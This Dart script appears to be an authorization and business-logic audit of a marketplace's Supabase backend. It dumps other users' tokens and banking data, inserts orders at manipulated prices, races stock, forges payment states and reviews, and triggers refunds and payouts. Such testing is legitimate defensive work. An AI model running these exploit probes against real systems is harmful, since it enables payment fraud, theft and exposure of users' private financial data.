import 'dart:convert';
import 'dart:io';
import 'dart:math';

import 'package:http/http.dart' as http;

import '_http.dart';

Future<void> main() async {
  final ctx = await boot();
  final matrix = <Map<String, dynamic>>[];
  final findings = <Map<String, dynamic>>[];
  final notes = <String>[];

  void row(String surface, String attack, String identity, Hit h,
      {String extra = ''}) {
    matrix.add({
      'surface': surface,
      'attack': attack,
      'identity': identity,
      'result': '${h.status} ${h.snippet}',
      'extra': extra,
    });
  }

  void finding({
    required String id,
    required String severity,
    required String title,
    required String actor,
    required String pre,
    required String repro,
    required String impact,
    Map<String, dynamic>? evidence,
  }) {
    findings.add({
      'id': id,
      'severity': severity,
      'title': title,
      'actor': actor,
      'preconditions': pre,
      'reproduction': repro,
      'impact': impact,
      'state': 'OPEN',
      if (evidence != null) 'evidence': evidence,
    });
  }

  // ---- cleanup mux live created in pass1 ----
  final muxComplete = await ctx.edge(
    'complete-mux-live',
    {'live_id': 'c44046cf-bfc8-412d-89c6-587a3bb16f10'},
    jwt: ctx.sellerJwt,
  );
  row('MUX', 'complete pass1 live', 'seller', muxComplete);

  // ---- dump leaky tables ----
  Future<List<Map<String, dynamic>>> dump(
    String table, {
    String? jwt,
    bool service = false,
    String select = '*',
    String? filter,
    int limit = 20,
  }) async {
    final h = await ctx.select(
      table,
      jwt: jwt,
      service: service,
      select: select,
      filter: filter,
      limit: limit,
    );
    final j = h.json;
    if (j is List) {
      return j.map((e) => Map<String, dynamic>.from(e as Map)).toList();
    }
    return [];
  }

  final tokensBuyer = await dump('seller_device_tokens', jwt: ctx.buyerJwt);
  final tokensSeller = await dump('seller_device_tokens', jwt: ctx.sellerJwt);
  final tokensSvc = await dump('seller_device_tokens', service: true, limit: 30);
  row(
    'DEVICE_TOKENS',
    'SELECT as buyer',
    'buyer',
    Hit(200, jsonEncode(tokensBuyer)),
    extra: 'n=${tokensBuyer.length}',
  );
  final buyerSawForeignTokens = tokensBuyer.any(
    (t) => t['seller_id'] != ctx.buyerId,
  );
  if (buyerSawForeignTokens) {
    finding(
      id: 'P1-DEVICE-TOKEN-CROSS',
      severity: 'P1',
      title: 'Buyer lê seller_device_tokens de outro seller',
      actor: 'buyer JWT',
      pre: 'JWT comprador',
      repro: 'GET /rest/v1/seller_device_tokens',
      impact: 'possível hijack OCR/PS se token em claro',
      evidence: {'rows': tokensBuyer},
    );
  }

  final tipsBuyer = await dump(
    'live_tips',
    jwt: ctx.buyerJwt,
    select: 'id,buyer_id,seller_id,live_id,amount,status,stripe_payment_intent_id',
  );
  final foreignTips = tipsBuyer
      .where((t) => t['buyer_id'] != ctx.buyerId && t['seller_id'] != ctx.buyerId)
      .toList();
  row('TIPS', 'SELECT', 'buyer', Hit(200, jsonEncode(tipsBuyer.take(3).toList())),
      extra: 'n=${tipsBuyer.length} foreign=${foreignTips.length}');
  if (foreignTips.isNotEmpty) {
    finding(
      id: 'P1-TIPS-CROSS',
      severity: 'P1',
      title: 'Buyer lê live_tips alheias',
      actor: 'buyer JWT',
      pre: 'JWT',
      repro: 'GET live_tips',
      impact: 'PII financeira de gorjetas',
      evidence: {'sample': foreignTips.take(3).toList()},
    );
  }

  final eventsBuyer = await dump(
    'stripe_checkout_events',
    jwt: ctx.buyerJwt,
    select: 'session_id,order_id,buyer_id,event,product_id,live_id',
  );
  final foreignEvents = eventsBuyer
      .where((e) => e['buyer_id'] != null && e['buyer_id'] != ctx.buyerId)
      .toList();
  row('STRIPE_EVENTS', 'SELECT', 'buyer',
      Hit(200, jsonEncode(eventsBuyer.take(2).toList())),
      extra: 'n=${eventsBuyer.length} foreign_buyer=${foreignEvents.length}');
  if (foreignEvents.isNotEmpty) {
    finding(
      id: 'P1-STRIPE-EVENTS-CROSS',
      severity: 'P1',
      title: 'Buyer lê stripe_checkout_events de outros buyers',
      actor: 'buyer JWT',
      pre: 'JWT',
      repro: 'GET stripe_checkout_events',
      impact: 'session_id / order_id alheios',
      evidence: {'sample': foreignEvents.take(3).toList()},
    );
  }

  final chatBuyer = await dump(
    'chat_messages',
    jwt: ctx.buyerJwt,
    select: 'id,sender_id,thread_id,conversation_id,buyer_id,seller_id,body,text,content',
  );
  row('CHAT', 'SELECT', 'buyer',
      Hit(200, jsonEncode({'n': chatBuyer.length, 'keys': chatBuyer.isEmpty ? [] : chatBuyer.first.keys.toList()})));

  final disputesBuyer = await dump('order_disputes', jwt: ctx.buyerJwt);
  final foreignDisputes = disputesBuyer.where((d) {
    final b = d['buyer_id'];
    final s = d['seller_id'];
    return b != ctx.buyerId && s != ctx.buyerId && b != ctx.sellerId;
  }).toList();
  row('DISPUTES', 'SELECT', 'buyer', Hit(200, jsonEncode({'n': disputesBuyer.length, 'foreign': foreignDisputes.length})));
  if (foreignDisputes.isNotEmpty) {
    finding(
      id: 'P1-DISPUTE-CROSS',
      severity: 'P1',
      title: 'Buyer lê order_disputes alheias',
      actor: 'buyer JWT',
      pre: 'JWT',
      repro: 'GET order_disputes',
      impact: 'dados de disputa alheios',
      evidence: {'sample': foreignDisputes.take(2).toList()},
    );
  }

  final reviewsBuyer = await dump(
    'reviews',
    jwt: ctx.buyerJwt,
    select: 'id,author_id,target_id,order_id,stars,author_role,purchase_verified,comment',
  );
  row('REVIEWS', 'SELECT', 'buyer',
      Hit(200, jsonEncode({'n': reviewsBuyer.length, 'sample': reviewsBuyer.take(2).toList()})));

  final ingestSeller = await dump('ps_ingest_audit', jwt: ctx.sellerJwt);
  final ingestBuyer = await dump('ps_ingest_audit', jwt: ctx.buyerJwt);
  row('PS_INGEST', 'SELECT', 'buyer', Hit(200, jsonEncode({'n': ingestBuyer.length})));
  row('PS_INGEST', 'SELECT', 'seller', Hit(200, jsonEncode({'n': ingestSeller.length, 'sample': ingestSeller.take(1).toList()})));

  // lives without secret columns
  final livesSafe = await ctx.select(
    'lives',
    jwt: ctx.buyerJwt,
    select: 'id,seller_id,status,is_active,mux_playback_id,title',
    limit: 8,
  );
  row('LIVES', 'SELECT safe cols', 'buyer', livesSafe);

  final raffleSafe = await ctx.select(
    'live_raffles',
    jwt: ctx.buyerJwt,
    select: 'id,live_id,seller_id,title,status,winner_count',
    limit: 8,
  );
  row('RAFFLE', 'SELECT without draw_seed', 'buyer', raffleSafe);

  // ---- disposable buyer2 ----
  final stamp = DateTime.now().millisecondsSinceEpoch;
  final email2 = 'cega1243+$stamp@fleaber.test';
  String? buyer2Id;
  String? buyer2Jwt;
  try {
    buyer2Id = await ctx.admin.createAdminUser(
      email: email2,
      password: 'TesteCega1243!',
      userMetadata: {'full_name': 'Cega Buyer2'},
    );
    // ensure profile
    await ctx.rest('POST', '/rest/v1/profiles', service: true, body: {
      'id': buyer2Id,
      'full_name': 'Cega Buyer2',
      'user_type': 'comprador',
    });
    buyer2Jwt = await ctx.admin.signIn(
      email: email2,
      password: 'TesteCega1243!',
    );
    notes.add('created buyer2 $buyer2Id');
  } catch (e) {
    notes.add('buyer2 create failed: $e');
  }

  if (buyer2Jwt != null) {
    final bank2 = await ctx.rpc(
      'batata_seller_direct_payment_details',
      {'p_seller_id': ctx.sellerId},
      jwt: buyer2Jwt,
    );
    row('BANKING', 'IBAN as stranger', 'buyer2', bank2);
    final j = bank2.json;
    final leaked = (j is List && j.isNotEmpty);
    if (leaked) {
      finding(
        id: 'P1-BANKING-ORACLE',
        severity: 'P1',
        title: 'Buyer sem relação lê IBAN/MB WAY do seller',
        actor: 'buyer2 JWT descartável',
        pre: 'conta nova sem orders',
        repro: 'rpc batata_seller_direct_payment_details(p_seller_id=seller)',
        impact: 'PII bancária',
        evidence: {'body': bank2.snippet},
      );
    }

    final orders2 = await ctx.select('orders', jwt: buyer2Jwt, limit: 20);
    row('ORDERS', 'SELECT as stranger', 'buyer2', orders2);

    final chat2 = await ctx.select('chat_messages', jwt: buyer2Jwt, limit: 20);
    row('CHAT', 'SELECT as stranger', 'buyer2', chat2);

    final tokens2 = await ctx.select('seller_device_tokens', jwt: buyer2Jwt, limit: 20);
    row('DEVICE_TOKENS', 'SELECT as stranger', 'buyer2', tokens2);

    final tips2 = await ctx.select('live_tips', jwt: buyer2Jwt, limit: 20);
    row('TIPS', 'SELECT as stranger', 'buyer2', tips2);

    final events2 = await ctx.select('stripe_checkout_events', jwt: buyer2Jwt, limit: 20);
    row('STRIPE_EVENTS', 'SELECT as stranger', 'buyer2', events2);

    final reviews2 = await ctx.select('reviews', jwt: buyer2Jwt, limit: 20);
    row('REVIEWS', 'SELECT as stranger', 'buyer2', reviews2);

    final disputes2 = await ctx.select('order_disputes', jwt: buyer2Jwt, limit: 20);
    row('DISPUTES', 'SELECT as stranger', 'buyer2', disputes2);

    final w2 = await ctx.select('wallet_transactions', jwt: buyer2Jwt, limit: 20);
    row('WALLET_TX', 'SELECT as stranger', 'buyer2', w2);

    final notif = await ctx.select('user_notifications', jwt: buyer2Jwt, limit: 10);
    row('NOTIFICATIONS', 'SELECT as stranger', 'buyer2', notif);
  }

  // ---- observe product schema via service ----
  final prodSample = await ctx.select(
    'products',
    service: true,
    select: 'id,seller_id,title,price,quantity,qty,stock,available_qty',
    limit: 1,
  );
  row('PRODUCTS', 'schema sample', 'service', prodSample);

  // create fixture product qty=1
  final prodIns = await ctx.rest('POST', '/rest/v1/products', jwt: ctx.sellerJwt, body: {
    'seller_id': ctx.sellerId,
    'title': 'CEGA1243 stock1 $stamp',
    'price': 12.50,
    'quantity': 1,
    'list_on_marketplace': true,
    'available_for_live': false,
    'description': 'audit fixture discard',
  });
  row('PRODUCTS', 'INSERT qty=1', 'seller', prodIns);
  String? productId;
  if (prodIns.ok) {
    final j = prodIns.json;
    if (j is List && j.isNotEmpty) {
      productId = (j.first as Map)['id']?.toString();
    } else if (j is Map) {
      productId = j['id']?.toString();
    }
  }

  // if insert failed due to columns, service_role insert
  if (productId == null) {
    final p2 = await ctx.rest('POST', '/rest/v1/products', service: true, body: {
      'seller_id': ctx.sellerId,
      'title': 'CEGA1243 stock1 svc $stamp',
      'price': 12.50,
      'quantity': 1,
      'list_on_marketplace': true,
    });
    row('PRODUCTS', 'INSERT qty=1 service', 'service', p2);
    final j = p2.json;
    if (j is List && j.isNotEmpty) productId = (j.first as Map)['id']?.toString();
    if (j is Map) productId = j['id']?.toString();
  }

  String? orderA;
  String? orderB;
  if (productId != null) {
    // buyer insert hostile order: price 0.01, qty 99, status pago, stripe ids
    final hostile = await ctx.rest('POST', '/rest/v1/orders', jwt: ctx.buyerJwt, body: {
      'buyer_id': ctx.buyerId,
      'seller_id': ctx.sellerId,
      'product_id': productId,
      'quantity': 99,
      'price_total': 0.01,
      'status': 'pago',
      'payment_method': 'Seguro Fleaber',
      'shipping_method': 'hand',
      'amount_paid_cents': 1,
      'stripe_payment_intent_id': 'pi_attacker',
      'stripe_checkout_session_id': 'cs_attacker',
      'contract_unit_cents': 1,
      'contract_qty': 99,
    });
    row('ORDERS', 'INSERT hostile price/qty/pago/stripe', 'buyer', hostile);
    final hj = hostile.json;
    if (hostile.ok) {
      if (hj is List && hj.isNotEmpty) orderA = (hj.first as Map)['id']?.toString();
      if (hj is Map) orderA = hj['id']?.toString();
    }

    // legitimate pending order qty 1
    final legit = await ctx.rest('POST', '/rest/v1/orders', jwt: ctx.buyerJwt, body: {
      'buyer_id': ctx.buyerId,
      'seller_id': ctx.sellerId,
      'product_id': productId,
      'quantity': 1,
      'price_total': 1,
      'status': 'pendente',
      'payment_method': 'Seguro Fleaber',
      'shipping_method': 'hand',
    });
    row('ORDERS', 'INSERT pendente qty1 price1', 'buyer', legit);
    final lj = legit.json;
    Map<String, dynamic>? legitRow;
    if (legit.ok) {
      if (lj is List && lj.isNotEmpty) {
        legitRow = Map<String, dynamic>.from(lj.first as Map);
        orderA = legitRow['id']?.toString();
      }
    }

    // observe sealed contract
    if (orderA != null) {
      final obs = await ctx.select(
        'orders',
        service: true,
        filter: 'id=eq.$orderA',
        select:
            'id,status,quantity,price_total,contract_unit_cents,contract_qty,amount_paid_cents,stripe_payment_intent_id,buyer_id,seller_id,product_id',
      );
      row('ORDERS', 'observe sealed', 'service', obs);
    }

    // second concurrent-ish order for stock=1
    final legit2 = await ctx.rest('POST', '/rest/v1/orders', jwt: ctx.buyerJwt, body: {
      'buyer_id': ctx.buyerId,
      'seller_id': ctx.sellerId,
      'product_id': productId,
      'quantity': 1,
      'status': 'pendente',
      'payment_method': 'Seguro Fleaber',
      'shipping_method': 'hand',
    });
    row('ORDERS', 'INSERT 2nd stock=1', 'buyer', legit2);
    if (legit2.ok) {
      final j = legit2.json;
      if (j is List && j.isNotEmpty) orderB = (j.first as Map)['id']?.toString();
    }

    // race 10x dual insert
    if (buyer2Jwt != null) {
      final futs = <Future<Hit>>[];
      for (var i = 0; i < 10; i++) {
        futs.add(ctx.rest('POST', '/rest/v1/orders', jwt: ctx.buyerJwt, body: {
          'buyer_id': ctx.buyerId,
          'seller_id': ctx.sellerId,
          'product_id': productId,
          'quantity': 1,
          'status': 'pendente',
          'payment_method': 'Seguro Fleaber',
          'shipping_method': 'hand',
        }));
        futs.add(ctx.rest('POST', '/rest/v1/orders', jwt: buyer2Jwt, body: {
          'buyer_id': buyer2Id,
          'seller_id': ctx.sellerId,
          'product_id': productId,
          'quantity': 1,
          'status': 'pendente',
          'payment_method': 'Seguro Fleaber',
          'shipping_method': 'hand',
        }));
      }
      final raced = await Future.wait(futs);
      final okIds = <String>[];
      for (final h in raced) {
        if (!h.ok) continue;
        final j = h.json;
        if (j is List && j.isNotEmpty) {
          okIds.add((j.first as Map)['id'].toString());
        }
      }
      final held = await ctx.select(
        'orders',
        service: true,
        filter: 'product_id=eq.$productId',
        select: 'id,buyer_id,status,quantity',
        limit: 50,
      );
      row('RACE', '20 parallel order inserts stock=1', 'buyer+buyer2',
          Hit(200, 'ok=${okIds.length} ${held.snippet}'));
      notes.add('race_ok_inserts=${okIds.length}');
    }

    // checkout amount manipulation
    if (orderA != null) {
      final ckLow = await ctx.edge('create-payment-intent', {
        'buyer_id': ctx.buyerId,
        'seller_id': ctx.sellerId,
        'order_id': orderA,
        'product_id': productId,
        'amount': 50,
        'quantity': 1,
        'shipping_method': 'hand',
        'item_price': 0.01,
      }, jwt: ctx.buyerJwt);
      row('CHECKOUT', 'amount=50 cents vs catalog', 'buyer', ckLow);

      final ckQty = await ctx.edge('create-payment-intent', {
        'buyer_id': ctx.buyerId,
        'order_id': orderA,
        'quantity': 99,
        'shipping_method': 'hand',
        'amount': 50,
      }, jwt: ctx.buyerJwt);
      row('CHECKOUT', 'qty=99 client', 'buyer', ckQty);

      final ckHand = await ctx.edge('create-payment-intent', {
        'buyer_id': ctx.buyerId,
        'order_id': orderA,
        'shipping_method': 'hand',
      }, jwt: ctx.buyerJwt);
      row('CHECKOUT', 'legit hand', 'buyer', ckHand);

      // seller checkout of buyer order
      final ckSeller = await ctx.edge('create-payment-intent', {
        'buyer_id': ctx.sellerId,
        'order_id': orderA,
        'shipping_method': 'hand',
      }, jwt: ctx.sellerJwt);
      row('CHECKOUT', 'seller pays buyer order', 'seller', ckSeller);

      if (buyer2Jwt != null) {
        final ckX = await ctx.edge('create-payment-intent', {
          'buyer_id': buyer2Id,
          'order_id': orderA,
          'shipping_method': 'hand',
        }, jwt: buyer2Jwt);
        row('CHECKOUT', 'buyer2 pays buyer1 order', 'buyer2', ckX);
      }

      // swap product_id in body
      final ckSwap = await ctx.edge('create-payment-intent', {
        'buyer_id': ctx.buyerId,
        'order_id': orderA,
        'product_id': '00000000-0000-0000-0000-000000000099',
        'seller_id': ctx.buyerId,
        'shipping_method': 'hand',
        'amount': 50,
      }, jwt: ctx.buyerJwt);
      row('CHECKOUT', 'swap product/seller in body', 'buyer', ckSwap);
    }

    // dual checkout sessions if both orders exist
    if (orderA != null && orderB != null) {
      final s1 = ctx.edge('create-payment-intent', {
        'buyer_id': ctx.buyerId,
        'order_id': orderA,
        'shipping_method': 'hand',
      }, jwt: ctx.buyerJwt);
      final s2 = ctx.edge('create-payment-intent', {
        'buyer_id': ctx.buyerId,
        'order_id': orderB,
        'shipping_method': 'hand',
      }, jwt: ctx.buyerJwt);
      final dual = await Future.wait([s1, s2]);
      row('CHECKOUT', 'dual session orderA', 'buyer', dual[0]);
      row('CHECKOUT', 'dual session orderB', 'buyer', dual[1]);
      notes.add('dualA=${dual[0].status} dualB=${dual[1].status}');
    }

    // FSM jumps on sealed order
    if (orderA != null) {
      for (final st in [
        'pago',
        'enviado',
        'entregue',
        'concluido',
        'devolvida',
        'premio_rifa',
      ]) {
        final u = await ctx.rest(
          'PATCH',
          '/rest/v1/orders?id=eq.$orderA',
          jwt: ctx.buyerJwt,
          body: {'status': st},
        );
        row('FSM', 'buyer PATCH status=$st', 'buyer', u);
      }
      final money = await ctx.rest(
        'PATCH',
        '/rest/v1/orders?id=eq.$orderA',
        jwt: ctx.buyerJwt,
        body: {
          'price_total': 0.01,
          'quantity': 99,
          'amount_paid_cents': 1,
          'stripe_payment_intent_id': 'pi_hack',
        },
      );
      row('ORDERS', 'buyer PATCH money cols', 'buyer', money);

      final sellerPago = await ctx.rest(
        'PATCH',
        '/rest/v1/orders?id=eq.$orderA',
        jwt: ctx.sellerJwt,
        body: {'status': 'pago'},
      );
      row('FSM', 'seller PATCH pago on Stripe order', 'seller', sellerPago);

      final after = await ctx.select(
        'orders',
        service: true,
        filter: 'id=eq.$orderA',
        select:
            'id,status,quantity,price_total,contract_unit_cents,contract_qty,amount_paid_cents,stripe_payment_intent_id',
      );
      row('ORDERS', 'after FSM attacks', 'service', after);

      // refund/release RPCs on real order
      final relB = await ctx.rpc(
        'batata_release_seller_wallet_for_order',
        {'p_order_id': orderA},
        jwt: ctx.buyerJwt,
      );
      final relS = await ctx.rpc(
        'batata_release_seller_wallet_for_order',
        {'p_order_id': orderA},
        jwt: ctx.sellerJwt,
      );
      final refB = await ctx.rpc(
        'batata_refund_buyer_wallet_for_order',
        {'p_order_id': orderA},
        jwt: ctx.buyerJwt,
      );
      final refS = await ctx.rpc(
        'batata_refund_buyer_wallet_for_order',
        {'p_order_id': orderA},
        jwt: ctx.sellerJwt,
      );
      row('WALLET_RPC', 'release as buyer', 'buyer', relB);
      row('WALLET_RPC', 'release as seller', 'seller', relS);
      row('WALLET_RPC', 'refund as buyer', 'buyer', refB);
      row('WALLET_RPC', 'refund as seller', 'seller', refS);
    }
  }

  // existing paid orders — try refund-order as buyer, release as stranger
  final paid = await dump(
    'orders',
    jwt: ctx.buyerJwt,
    select:
        'id,status,buyer_id,seller_id,amount_paid_cents,price_total,wallet_release_processed_at,wallet_refund_processed_at,payment_method',
    filter: 'status=in.(pago,enviado,entregue,concluido)',
    limit: 10,
  );
  row('ORDERS', 'buyer paid-like', 'buyer', Hit(200, jsonEncode(paid)));
  if (paid.isNotEmpty) {
    final oid = paid.first['id'].toString();
    final rfBuyer = await ctx.edge('refund-order', {'order_id': oid}, jwt: ctx.buyerJwt);
    row('REFUND_EDGE', 'buyer refunds own', 'buyer', rfBuyer);
    final rfSeller = await ctx.edge('refund-order', {'order_id': oid}, jwt: ctx.sellerJwt);
    row('REFUND_EDGE', 'seller refunds', 'seller', rfSeller);
    if (buyer2Jwt != null) {
      final rf2 = await ctx.edge('refund-order', {'order_id': oid}, jwt: buyer2Jwt);
      row('REFUND_EDGE', 'stranger refunds', 'buyer2', rf2);
    }
    final relPaid = await ctx.rpc(
      'batata_release_seller_wallet_for_order',
      {'p_order_id': oid},
      jwt: ctx.buyerJwt,
    );
    row('WALLET_RPC', 'release on existing paid-like', 'buyer', relPaid);
  }

  // reviews insert without order
  final revIns = await ctx.rest('POST', '/rest/v1/reviews', jwt: ctx.buyerJwt, body: {
    'author_id': ctx.buyerId,
    'target_id': ctx.sellerId,
    'target_type': 'seller',
    'stars': 5,
    'comment': 'cega fake review',
    'author_role': 'buyer',
    'purchase_verified': true,
  });
  row('REVIEWS', 'INSERT without order verified', 'buyer', revIns);

  final revAsSeller = await ctx.rest('POST', '/rest/v1/reviews', jwt: ctx.buyerJwt, body: {
    'author_id': ctx.sellerId,
    'target_id': ctx.buyerId,
    'target_type': 'buyer',
    'stars': 1,
    'comment': 'impersonate',
    'author_role': 'seller',
  });
  row('REVIEWS', 'INSERT author=seller as buyer JWT', 'buyer', revAsSeller);

  // double review if we have an order with review possible
  if (paid.isNotEmpty) {
    final oid = paid.first['id'].toString();
    final r1 = await ctx.rest('POST', '/rest/v1/reviews', jwt: ctx.buyerJwt, body: {
      'author_id': ctx.buyerId,
      'target_id': ctx.sellerId,
      'order_id': oid,
      'stars': 5,
      'comment': 'dup1',
      'author_role': 'buyer',
    });
    final r2 = await ctx.rest('POST', '/rest/v1/reviews', jwt: ctx.buyerJwt, body: {
      'author_id': ctx.buyerId,
      'target_id': ctx.sellerId,
      'order_id': oid,
      'stars': 1,
      'comment': 'dup2',
      'author_role': 'buyer',
    });
    row('REVIEWS', 'dup1 on paid order', 'buyer', r1);
    row('REVIEWS', 'dup2 on paid order', 'buyer', r2);
  }

  // offers
  if (productId != null) {
    final off = await ctx.rest('POST', '/rest/v1/product_offers', jwt: ctx.buyerJwt, body: {
      'product_id': productId,
      'buyer_id': ctx.buyerId,
      'seller_id': ctx.sellerId,
      'amount': 0.01,
      'status': 'accepted',
    });
    row('OFFERS', 'INSERT self-accepted 0.01', 'buyer', off);
  }

  // bag qty RPC with real reservation if any
  final bags = await dump(
    'live_reservation_requests',
    jwt: ctx.buyerJwt,
    select: 'id,buyer_id,live_item_id,status,requested_qty,source',
    limit: 10,
  );
  row('BAG', 'list reservations', 'buyer', Hit(200, jsonEncode(bags)));
  if (bags.isNotEmpty) {
    final rid = bags.first['id'].toString();
    final q99 = await ctx.rpc(
      'batata_live_bag_update_qty',
      {'p_request_id': rid, 'p_qty': 99},
      jwt: ctx.buyerJwt,
    );
    row('BAG', 'update qty 99', 'buyer', q99);
    if (buyer2Jwt != null) {
      final qx = await ctx.rpc(
        'batata_live_bag_update_qty',
        {'p_request_id': rid, 'p_qty': 2},
        jwt: buyer2Jwt,
      );
      row('BAG', 'stranger updates qty', 'buyer2', qx);
    }
  }

  // mark live item sold
  final items = await dump(
    'live_items',
    jwt: ctx.sellerJwt,
    select: 'id,live_id,seller_id,status,price,product_id',
    limit: 5,
  );
  if (items.isNotEmpty) {
    final lid = items.first['id'].toString();
    final soldB = await ctx.rpc(
      'batata_mark_live_item_sold',
      {'p_live_item_id': lid},
      jwt: ctx.buyerJwt,
    );
    final soldS = await ctx.rpc(
      'batata_mark_live_item_sold',
      {'p_live_item_id': lid},
      jwt: ctx.sellerJwt,
    );
    row('LIVE_ITEM', 'mark sold as buyer', 'buyer', soldB);
    row('LIVE_ITEM', 'mark sold as seller', 'seller', soldS);
    final stockAnon = await ctx.rpc(
      'batata_live_item_stock',
      {'p_live_item_id': lid},
    );
    row('LIVE_ITEM', 'stock as anon', 'anon', stockAnon);
  }

  // tick raffle as buyer
  final raffles = await dump(
    'live_raffles',
    jwt: ctx.sellerJwt,
    select: 'id,seller_id,status,title',
    limit: 5,
  );
  // seller 403 on * — try safe cols via service
  final rafflesSvc = await dump(
    'live_raffles',
    service: true,
    select: 'id,seller_id,status,title,draw_seed',
    limit: 3,
  );
  row('RAFFLE', 'service sample draw_seed present?', 'service',
      Hit(200, jsonEncode(rafflesSvc.map((e) => {
            'id': e['id'],
            'has_seed': (e['draw_seed'] ?? '').toString().isNotEmpty,
            'status': e['status'],
          }).toList())));
  if (rafflesSvc.isNotEmpty) {
    final rid = rafflesSvc.first['id'].toString();
    final tickB = await ctx.rpc(
      'batata_tick_live_raffle',
      {'p_raffle_id': rid},
      jwt: ctx.buyerJwt,
    );
    row('RAFFLE', 'tick as buyer', 'buyer', tickB);
  }

  // storage fleaber_private + chat_media
  for (final bkt in ['fleaber_private', 'chat_media']) {
    final list = await ctx.rest(
      'POST',
      '/storage/v1/object/list/$bkt',
      jwt: ctx.buyerJwt,
      body: {'prefix': '', 'limit': 30},
    );
    row('STORAGE', 'list $bkt', 'buyer', list);
    if (buyer2Jwt != null) {
      final l2 = await ctx.rest(
        'POST',
        '/storage/v1/object/list/$bkt',
        jwt: buyer2Jwt,
        body: {'prefix': '', 'limit': 30},
      );
      row('STORAGE', 'list $bkt', 'buyer2', l2);
    }
  }

  // payout as buyer of own wallet (amount huge)
  final payB = await ctx.edge('create-connect-account', {
    'user_id': ctx.buyerId,
    'amount': 999999,
    'idempotency_key': 'cega-1243-huge-${Random().nextInt(99999)}',
  }, jwt: ctx.buyerJwt);
  row('PAYOUT', 'buyer amount 999999 cents', 'buyer', payB);

  final payS = await ctx.edge('create-connect-account', {
    'amount': 1,
    'idempotency_key': 'cega-1243-one-${Random().nextInt(99999)}',
  }, jwt: ctx.sellerJwt);
  row('PAYOUT', 'seller amount 1 cent', 'seller', payS);

  // tip mint: insert live_tips
  final tipIns = await ctx.rest('POST', '/rest/v1/live_tips', jwt: ctx.buyerJwt, body: {
    'buyer_id': ctx.buyerId,
    'seller_id': ctx.sellerId,
    'amount': 50,
    'status': 'paid',
  });
  row('TIPS', 'INSERT paid 50', 'buyer', tipIns);

  // profiles IBAN of seller via select
  final profSeller = await ctx.select(
    'profiles',
    jwt: ctx.buyerJwt,
    filter: 'id=eq.${ctx.sellerId}',
    select: 'id,full_name,user_type,mb_way,iban,phone,handle',
  );
  row('PROFILES', 'SELECT seller PII', 'buyer', profSeller);
  if (buyer2Jwt != null) {
    final p2 = await ctx.select(
      'profiles',
      jwt: buyer2Jwt,
      filter: 'id=eq.${ctx.sellerId}',
      select: 'id,full_name,mb_way,iban,phone',
    );
    row('PROFILES', 'SELECT seller PII', 'buyer2', p2);
  }

  // email enum as seller of random emails
  if (ctx.sellerJwt.isNotEmpty) {
    final e1 = await ctx.rpc(
      'batata_find_user_id_by_email',
      {'p_email': 'naoexiste@example.com'},
      jwt: ctx.sellerJwt,
    );
    row('AUTH', 'email enum miss', 'seller', e1);
  }

  // create-mux-live as buyer2 after trying user_type (already frozen)
  if (buyer2Jwt != null) {
    final muxB2 = await ctx.edge('create-mux-live', {'title': 'buyer2 hijack live xx'},
        jwt: buyer2Jwt);
    row('MUX', 'create as buyer2', 'buyer2', muxB2);
  }

  // OCR with leaked token if any plaintext
  for (final t in tokensSeller) {
    final raw = (t['token'] ?? t['device_token'] ?? '').toString();
    if (raw.length >= 8) {
      final ocr = await ctx.rest(
        'POST',
        '/functions/v1/ingest-ocr-reservation',
        jwt: ctx.buyerJwt,
        extra: {'x-device-token': raw},
        body: {
          'live_id': (items.isNotEmpty ? items.first['live_id'] : '') ?? '',
          'ocr_line_hash': 'cegahash12',
          'detected_at': DateTime.now().toUtc().toIso8601String(),
          'ref_number': 1,
        },
      );
      row('OCR', 'ingest with listed token', 'buyer+token', ocr);
      break;
    }
  }

  // wallet balance after attacks
  final wB = await ctx.select(
    'wallets',
    service: true,
    filter: 'id=eq.${ctx.buyerId}',
    select: 'id,balance',
  );
  final wS = await ctx.select(
    'wallets',
    service: true,
    filter: 'id=eq.${ctx.sellerId}',
    select: 'id,balance',
  );
  row('WALLET', 'buyer after', 'service', wB);
  row('WALLET', 'seller after', 'service', wS);

  await writeOut('pass2.json', {
    'pass': 2,
    'product_id': productId,
    'order_a': orderA,
    'order_b': orderB,
    'buyer2_id': buyer2Id,
    'notes': notes,
    'matrix': matrix,
    'findings': findings,
    'tokens_buyer': tokensBuyer,
    'foreign_tips': foreignTips.length,
    'foreign_events': foreignEvents.length,
  });
  stdout.writeln(
      'PASS2 done findings=${findings.length} matrix=${matrix.length} product=$productId');
}
